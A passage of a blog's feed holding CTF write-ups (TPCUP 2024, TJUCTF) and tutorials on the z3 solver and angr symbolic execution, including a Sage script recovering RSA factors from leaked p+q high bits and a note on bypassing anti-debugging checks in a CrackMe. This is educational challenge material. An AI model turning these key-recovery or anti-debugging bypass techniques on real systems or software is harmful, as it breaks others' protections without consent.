id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h3><p>base64 解码 <code>ZmxhZ3tmbGFnYmFzZTY0fQ==</code><br><code>flag&#123;flagbase64&#125;</code></p><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>点开 t2 可找到<br>AES&#x2F;ECB&#x2F;PKCS5Padding 解密 <code>e+Fy/ONEqoJVBIXzCLZ6Kx+vjukEgXFkOaet9ti3hrc=</code>，密钥是 flag2<br><code>flag&#123;alldone!!!&#125;</code></p><h2 id="主唱太拼命了"><a href="#主唱太拼命了" class="headerlink" title="主唱太拼命了"></a>主唱太拼命了</h2><p>RSA 已知部分高位攻击，但教程一般给的是已知 p 高位，没有已知 p+q 高位的解法<br>这里 <a href="https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage">https://github.com/7feilee/ctf_writeup&#x2F;blob&#x2F;master&#x2F;2020&#x2F;HITCTF&#x2F;crypto_dgk&#x2F;src&#x2F;solve.sage</a> 提供了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br></pre></td></tr></table></figure><p>稍微改了一下脚本用 sage 求解 p 和 q</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">p_add_q = <span class="number">19908296297154261193603784476638931123516240704025306244561930935833463971799128110489967448460913311580547389743367260902522865073200825917723058108366848</span></span><br><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">poly = p_pro + x</span><br><span class="line">x0 = poly.small_roots(X = <span class="number">2</span> ** <span class="number">100</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(gcd(p_pro + x0[<span class="number">0</span>], n))</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>求得 p 和 q 后可以解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, inverse</span><br><span class="line"></span><br><span class="line">c = <span class="number">18440872486403323622510807012978507180529941426106643115456980837956295325764192595485820729772845428753953590301713705078399201869365193708057327848899904074671832807596665367550614919055119509073812499316019447070077472419739116237952486260179612984582496862441609849035603842161839069407115218245681423369</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">e = bytes_to_long(<span class="string">b&quot;too desperate!&quot;</span>)</span><br><span class="line">p = <span class="number">10157834627517369652898607336515095650881694895149683559384292084371259269447224625631118311560267756403388223138257762142383835818056617774624176508335047</span></span><br><span class="line">q = <span class="number">9750461669636891540705177140123835472634545808875622685177638851462204702351903484858849136900645555177159166605109498760139029255144208849671942596334519</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>flag&#123;th3_w0rld_1s_An0n_t0ky0&#125;</code></p><h2 id="投稿-CrackMe"><a href="#投稿-CrackMe" class="headerlink" title="[投稿]CrackMe"></a>[投稿]CrackMe</h2><p>由于是静态 flag，因此只要绕过调试检测后 (在 <code>isDebuggerPresent</code>、<code>anti_debugger</code> 判断处下断点返回值改成 0)，在 <code>RSADecryptor</code> 函数部分下断点获取 v4 的值就是 flag</p><p><code>flag&#123;Xyu_h0is_z7Qs_l0VE&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TPCUP-2024&quot;&gt;&lt;a href=&quot;#TPCUP-2024&quot; class=&quot;headerlink&quot; title=&quot;TPCUP 2024&quot;&gt;&lt;/a&gt;TPCUP 2024&lt;/h1&gt;&lt;h2 id=&quot;X…什么？&quot;&gt;&lt;a href=&quot;#X…什么？&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>等式问题与z3的使用</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/%E7%AD%89%E5%BC%8F%E9%97%AE%E9%A2%98%E5%92%8CZ3%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/%E7%AD%89%E5%BC%8F%E9%97%AE%E9%A2%98%E5%92%8CZ3%E4%BD%BF%E7%94%A8/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-09-16T07:40:23.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="等式问题与-z3-的使用"><a href="#等式问题与-z3-的使用" class="headerlink" title="等式问题与 z3 的使用"></a><strong>等式问题与</strong> <strong>z3</strong> <strong>的使用</strong></h1><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a><strong>基本数据类型</strong></h3><p>在Python中使用 Z3 模块，我们的所求结果一般有以下几种数据类型：</p><ul><li><p><strong>Int</strong></p></li><li><p>Real</p></li><li><p>Bool</p></li><li><p>Array</p></li><li><p><strong>BitVec(‘a’, 8)</strong></p></li></ul><p>其中 BitVec 可以是特定大小的数据类型，不一定是 8 位，例如 C 语言中的 int 型可以用 BitVec(‘a’, 32)</p><p>表示。</p><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a><strong>基本语句</strong></h3><p>在 Python 中使用该模块，我们通常用到如下几个 API：</p><ul><li><p>**Solver()**：创建一个通用求解器，以进行下一步的求解</p></li><li><p>**add()**：添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式</p></li><li><p>**check()**：添加完约束条件后，用来来检测解的情况，有解的时候会返回 sat，无解的时候会返回unsat</p></li><li><p>**model()**：在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解</p></li></ul><p>分别对应设未知数，列方程组，判断方程是否有解，解方程组。</p><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a><strong>简单使用</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240302165337491.png" alt="image-20240302165337491"></p><h3 id="入门实践"><a href="#入门实践" class="headerlink" title="入门实践"></a><strong>入门实践</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = Int(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(b == a - <span class="number">2</span>)</span><br><span class="line">s.add(d == c + <span class="number">2</span>)</span><br><span class="line">s.add(d == a + <span class="number">5</span>)</span><br><span class="line">s.add(b - <span class="number">20</span> + c - <span class="number">20</span> == <span class="number">15</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="comment"># _solve = s.model()</span></span><br><span class="line"><span class="comment"># print(_solve)</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240302165540789.png" alt="image-20240302165540789"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">code = [Int(<span class="built_in">str</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GoodValueBadPlace</span>(<span class="params">nums, count</span>):</span><br><span class="line">    exps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exps.append(If(nums[i] == code[j], <span class="number">1</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> Sum(exps) == count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># one number is correct and well-placed</span></span><br><span class="line">s.add(Or(code[<span class="number">0</span>] == <span class="number">2</span>, code[<span class="number">1</span>] == <span class="number">9</span>, code[<span class="number">2</span>] == <span class="number">1</span>))</span><br><span class="line"><span class="comment"># one number is correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>], <span class="number">1</span>))</span><br><span class="line"><span class="comment"># two numbers are correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>], <span class="number">2</span>))</span><br><span class="line"><span class="comment"># nothing is correct</span></span><br><span class="line">s.add(And(code[<span class="number">0</span>] != <span class="number">5</span>, code[<span class="number">1</span>] != <span class="number">7</span>, code[<span class="number">2</span>] != <span class="number">9</span>))</span><br><span class="line"><span class="comment"># one number is correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>], <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> code:</span><br><span class="line">        <span class="built_in">print</span>(m[c], end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;等式问题与-z3-的使用&quot;&gt;&lt;a href=&quot;#等式问题与-z3-的使用&quot; class=&quot;headerlink&quot; title=&quot;等式问题与 z3 的使用&quot;&gt;&lt;/a&gt;&lt;strong&gt;等式问题与&lt;/strong&gt; &lt;strong&gt;z3&lt;/strong&gt; &lt;strong</summary>
      
    
    
    
    
    <category term="Z3 RE CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/Z3-RE-CTF/"/>
    
  </entry>
  
  <entry>
    <title>TJUCTF202401WP</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-09-16T07:13:30.497Z</updated>
    
    <content type="html"><![CDATA[<p>TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}</p><p>base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D</p><p>base32:GU2DIQJVGU2DGNJUGQ3DOQRUII2DMNBTGVDDIMZXGIZTIMZSG44TKRRVGQ3DQNZVG4ZDGNJWGQZTINZZGVDDONRVIY2EIMZTGVDDGNJTGAZDCN2E</p><p>base64:R1UyRElRSlZHVTJER05KVUdRM0RPUVJVSUkyRE1OQlRHVkRESU1aWEdJWlRJTVpTRzQ0VEtSUlZHUTNEUU5aVkc0WkRHTkpXR1FaVElOWlpHVkRET05SVklZMkVJTVpUR1ZEREdOSlRHQVpEQ04yRQ&#x3D;&#x3D;</p><p>base 91:</p><p>&amp;w”dA6D<em>t7f!}DfeFdJz<del>hF#Q8Jz@7</del>Q^tu0Z0+SB8</em>@@7dR#ww2&gt;y,#t7JbAPQiCP;1j95NGNlf{x{cPxXx*wnTAPPlo77d_OAeul[j@#F)1l<del>cF5nJS!nHg5rfFw_b%i@J!83NRM</del>(Ikge`ipeq;O6:O”(XafRFP(dv+4SET$LI,tn1wWEW&#96;nH.3e</p><p>base100:🐝👮🐙👛S🐸🐭🐻🐡👫🐮👝🐘👴🐻👝👜🐽👛👁👱👵👟🐽🐚👈🐯👁👱🐷🐮👵👈👕👫👬🐧👑🐧🐢👊🐹🐯🐡🐷🐷🐮👛👉🐚👮👮🐩🐵👰🐣🐚👫🐮👁👙🐸👇👈👠🐺👇🐲🐨👡🐰🐬👅🐾👅👣👝👲👯👲👚👇👯👏👯🐡👮👥👋🐸👇👇👣👦🐮🐮👛👖👆🐸👜👬👣👒👡🐷🐚🐽🐠🐨👣👵👚🐽🐬👥👁👊🐘👥🐿👞🐬👩👝🐽👮👖👙🐜👠🐷👁🐘🐯🐪👅👉👄👵🐟👀👢👞👜👗👠👧👜👨🐲👆🐭🐱👆🐙🐟👏👘👝👉🐽👇🐟👛👭🐢🐫👊🐼👋🐛👃👀🐣👫👥🐨👮👎🐼👎👗👥🐿🐥🐪👜</p><p><a href="https://www.cnblogs.com/chddt/p/13262385.html">事件ID</a></p><p><a href="https://www.cnblogs.com/chddt/p/13262385.html">https://www.cnblogs.com/chddt/p/13262385.html</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="我flag呢？"><a href="#我flag呢？" class="headerlink" title="我flag呢？"></a>我flag呢？</h3><p>**[图片隐写]**winhex修改图片长度</p><h3 id="是时候发挥社工本领了"><a href="#是时候发挥社工本领了" class="headerlink" title="是时候发挥社工本领了"></a>是时候发挥社工本领了</h3><p>百度识图</p><h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a>bases</h3><p>**[多重加密]**base100–91–64–32–16</p><h3 id="tttupper！"><a href="#tttupper！" class="headerlink" title="tttupper！"></a>tttupper！</h3><p>**[tupper加密]**用现有的工具</p><h3 id="VVVigenere"><a href="#VVVigenere" class="headerlink" title="VVVigenere"></a>VVVigenere</h3><p><strong>[Vigenere加密]</strong></p><h3 id="天外虫鸣"><a href="#天外虫鸣" class="headerlink" title="天外虫鸣"></a>天外虫鸣</h3><p>[特殊传播方式]SSTV</p><h3 id="路过什么都要拍"><a href="#路过什么都要拍" class="headerlink" title="路过什么都要拍"></a>路过什么都要拍</h3><p>**[社工]**根据图片中三星堆和成都地铁标志，猜测德阳站</p><h3 id="唉！无尽的拉格朗日！"><a href="#唉！无尽的拉格朗日！" class="headerlink" title="唉！无尽的拉格朗日！"></a>唉！无尽的拉格朗日！</h3><p>key是16进制转字符后文字加密</p><p>音频出密码，注意文件名要大写，steghide隐写</p><h3 id="进阶-日志分析"><a href="#进阶-日志分析" class="headerlink" title="[进阶]日志分析"></a>[进阶]日志分析</h3><p>电脑不方便看，转成txt或者csv，</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="入门-从头开始了解逆向"><a href="#入门-从头开始了解逆向" class="headerlink" title="[入门]从头开始了解逆向"></a>[入门]从头开始了解逆向</h3><p>一个简单的异或操作</p><h3 id="入门-111真签到"><a href="#入门-111真签到" class="headerlink" title="[入门]111真签到"></a>[入门]111真签到</h3><p>用IDA看程序的简单异或操作</p><h3 id="脑洞-Art！"><a href="#脑洞-Art！" class="headerlink" title="[脑洞]Art！"></a>[脑洞]Art！</h3><p>修改IDA最高展示字节码，在缩略图看flag</p><h3 id="基础-Soyo，来杯红茶"><a href="#基础-Soyo，来杯红茶" class="headerlink" title="[基础]Soyo，来杯红茶"></a>[基础]Soyo，来杯红茶</h3><p>提示是tea加密，看特征和key值</p><p>然后tea解码</p><h3 id="脑洞-想玩儿红白机了"><a href="#脑洞-想玩儿红白机了" class="headerlink" title="[脑洞]想玩儿红白机了"></a>[脑洞]想玩儿红白机了</h3><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p>好用的工具，</p><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>了解程序运行内容，写脚本</p><h3 id="基础-ezRE"><a href="#基础-ezRE" class="headerlink" title="[基础]ezRE"></a>[基础]ezRE</h3><h4 id="法一：-1"><a href="#法一：-1" class="headerlink" title="法一："></a>法一：</h4><p>ollvm反混淆</p><h4 id="法二：（非预期）"><a href="#法二：（非预期）" class="headerlink" title="法二：（非预期）"></a>法二：（非预期）</h4><p>看程序推理加密方式，</p><p>先改表，再加密</p><p>嗯……很简单。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}&lt;/p&gt;
&lt;p&gt;base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D&lt;/p&gt;
&lt;p&gt;base32:GU</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>符号执行框架</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/</id>
    <published>2024-02-17T16:00:00.000Z</published>
    <updated>2024-09-16T07:12:34.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="符号执行框架"><a href="#符号执行框架" class="headerlink" title="符号执行框架"></a>符号执行框架</h1><h2 id="符号执行介绍"><a href="#符号执行介绍" class="headerlink" title="符号执行介绍"></a>符号执行介绍</h2><p>随着时代的发展，程序的流程越来越复杂，如果我们继续像以前那样在 ida 里仔细分析，肯定是太累了，所以有些科学家想要用自动化的算法来进行逆向工程，然后，他们就提出了符号执行这个算法。</p><p>符号执行算法听起来很高端，其实内部算法却并不难理解，接下来就介绍一下符号执行的核心理念。</p><p>假如有这样一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们现在想要知道为了让程序到达 puts(‘Success.’) 这一行，需要的输入条件是什么，那我们要怎么得出到达这一行的条件呢？首先我们来看看执行这个程序的时候，user_input 都经历了什么。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216232938209.png" alt="image-20240216232938209"></p><p>user_input 经过了一个判断语句，其中 user_input - 10&gt;&#x3D; 0 就是成功的条件。所以很显然，我们只</p><p>要将这个不等式解出来，就能知道需要的条件了。</p><p>那么接下来假如说有一个这样的程序呢：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (user_input &lt;= <span class="number">20</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序稍微复杂了那么一点。但是这不是问题，我们照着解决上一个程序的方法，先看看</p><p>user_input 都经历了什么：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233010717.png" alt="image-20240216233010717"></p><p>不难看出， user_input 经历了个两个判断条件，所以这回我们为了得出输出成功的条件，我们得解一</p><p>个方程组：<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233023177.png" alt="image-20240216233023177"></p><p>不难发现，就算 if 语句再多，只要能够一个个收集齐全，将这些条件形成一个（不）等式组，然后解出</p><p>这个（不）等式组，就可以得到我们想要的输出了。</p><p>但是现实生活中的程序不可能这么简单，单凭人力是无法收集全的，那么我们自然是要用程序来收集。</p><p>这个时候就该我们的 angr 登场了。</p><p>angr 作为一个二进制分析的工具包，但它通常作为符号执行工具更为出名。</p><p>符号执行就是给程序传递一个符号而不是具体的值，让这个符号伴随程序运行，当碰见分支时，符号会</p><p>进入哪个分支呢？</p><p>angr 的回答是全都进入。angr 会保存所有分支，以及分支后的所有分支，并且在分支时，保存进入该</p><p>分支时的判断条件，通常这些判断条件时对符号的约束。</p><p>当 angr 运行到目标状态时，就可以调用求解器对一路上收集到的约束进行求解，最终得到某个符号能</p><p>够到达当前状态的值。</p><h2 id="angr-核心概念"><a href="#angr-核心概念" class="headerlink" title="angr 核心概念"></a><strong>angr</strong> <strong>核心概念</strong></h2><h3 id="顶层接口"><a href="#顶层接口" class="headerlink" title="顶层接口"></a><strong>顶层接口</strong></h3><p>Project 类是 angr 的主类，也是 angr 的开始，通过初始化该类的对象，可以将你想要分析的二进制文</p><p>件加载进来，就像这样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&quot;./test&quot;</span>)</span><br></pre></td></tr></table></figure><p>参数为待分析的文件路径，它是唯一必须传入的参数，此外还有一个比较常用的参数 load-options，它</p><p>指明加载的方式，如下</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233058337.png" alt="image-20240216233058337"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233105524.png" alt="image-20240216233105524"></p><h3 id="State"><a href="#State" class="headerlink" title="State"></a><strong>State</strong></h3><p>Project 实际上只是将二进制文件加载进来了，要执行它，实际上是对 SimState 对象进行操作，它是程</p><p>序的状态。</p><p>要创建状态，需要使用 Project 对象中的 factory，它还可以用于创建模拟管理器和基本块，如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = p.factory.entry_state()</span><br></pre></td></tr></table></figure><p>预设状态有四种方式如下：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233150939.png" alt="image-20240216233150939"></p><p>状态包含了程序运行时的一切信息，寄存器、内存的值、文件系统以及<strong>符号变量</strong>等，这些信息的使用等</p><p>用到时再进一步说明。</p><p>entry_state 和 blank_state 是常用的两种方式，后者通常用于跳过一些极大降低 angr 效率的指令，它</p><p>们间的对比如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; state = p.factory.entry_state()</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 <span class="number">0</span>x1c&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br><span class="line">&gt;&gt;&gt; state = p.factory.blank_state(addr=<span class="number">0</span>x4023c0)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 reg_rax_42_64&#123;UNINITIALIZED&#125;&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br></pre></td></tr></table></figure><p>在 blank_state 方式中，我们仍将地址设定为程序的入口点，然而 rax 中的值由于没有初始化，它现在</p><p>是一个名字，也即符号变量，这是符号执行的基础。此外，可以看到寄存器中的数据类型并不是 int，</p><p>而是 BV64，它是一个位向量（Bit Vector）。</p><h3 id="Simulation-Manager"><a href="#Simulation-Manager" class="headerlink" title="Simulation Manager"></a><strong>Simulation Manager</strong></h3><p>上述方式只是预设了程序开始分析时的状态，我们要分析程序就必须要让它到达下一个状态，这就需要</p><p>模拟管理器的帮助（简称 SM）。</p><p>使用以下指令能创建一个 SM，它需要传入一个 state 或者 state 的列表作为参数：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233228867.png" alt="image-20240216233228867"></p><p>默认情况下，state 会被存放在 active 中。</p><p>可以通过 step() 方法来让处于 active 的 state 执行一个基本块，这种操作不会改变 state 本身（类比</p><p>docker）：<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233245331.png" alt="image-20240216233245331"></p><h3 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a><strong>Explorer</strong></h3><p>可以使用 explorer 方法去执行某个状态，直到找到目标指令或者 active 中没有状态为止，它有如下参</p><p>数：</p><p>find：传入目标指令的地址或地址列表，或者一个用于判断的函数</p><p>avoid：传入要避免的指令的地址或地址列表，或者一个用于判断的函数，用于减少路径</p><p>angr 会沿着分支按照某种策略（默认DFS）进行状态搜索，当达到目标状态时，使用约束求解器</p><p>（claripy）对收集到的约束进行求解。</p><p>因此，使用 angr 一般分为如下步骤：</p><p>\1. 创建 Project，预设 state</p><p>\2. 创建位向量和符号变量，保存在内存&#x2F;寄存器&#x2F;文件或其他地方</p><p>\3. 将 state 添加到 SM 中</p><p>\4. 运行，探索满足条件的路径</p><p>\5. 约束求解获取执行结果</p><h2 id="angr-入门练习"><a href="#angr-入门练习" class="headerlink" title="angr 入门练习"></a><strong>angr</strong> <strong>入门练习</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_aut0m4t3_0r_4r3_y0u_h4rdw0rk1ng_?&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_aut0m4t3_0r_4r3_y0u_h4rdw0rk1ng_?&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
